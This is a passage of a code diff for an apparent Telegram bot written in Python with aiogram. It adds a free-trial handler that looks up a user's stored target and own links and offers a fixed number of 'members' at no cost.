+                f"👥 {members}\n💰 {cost}\n🎯 {data.get('target')}\n🏠 {data.get('own')}\n"
                 f"🕒 {now_str()}")
         except Exception: pass
     await state.clear()
@@ -1347,6 +1311,27 @@ async def free_confirm(c: types.CallbackQuery, state: FSMContext):
             [IKB(text="🔙  Dashboard",  callback_data="menu")],
         ]))
     await c.answer("🎉")
+
+@dp.callback_query(F.data == "free_trial")
+async def cb_free_trial(c: types.CallbackQuery, state: FSMContext):
+    lg = get_lang(c.from_user.id)
+    if not trial_available(c.from_user.id):
+        await c.answer("❌ Trial already used!", show_alert=True); return
+    tgt = conn.execute("SELECT target_link FROM users WHERE user_id=?", (c.from_user.id,)).fetchone()
+    own = conn.execute("SELECT own_link FROM users WHERE user_id=?", (c.from_user.id,)).fetchone()
+    if not tgt or not tgt[0]:
+        await c.answer("❌ Pehle Target set karein!", show_alert=True); return
+    await state.set_state(FreeOrder.confirm)
+    await state.update_data(
+        trial=True, members=TRIAL_MEMBERS, cost=0,
+        target=tgt[0], own=(own[0] if own and own[0] else "—"))
+    await c.message.edit_text(
+        f"🎁 FREE TRIAL\n━━━━━━━━━━━━━━━━━━━━\n\n"
+        f"✨ You get {TRIAL_MEMBERS} members FREE!\n\n"
+        f"🎯 Target: {tgt[0]}\n🏠 Own: {own[0] if own and own[0] else '—'}\n\n"
+        f"Confirm?",
+        reply_markup=free_confirm_kb(lg))
+    await c.answer("🎁")
 
 @dp.callback_query(F.data == "free_no")
 async def free_no(c: types.CallbackQuery, state: FSMContext):
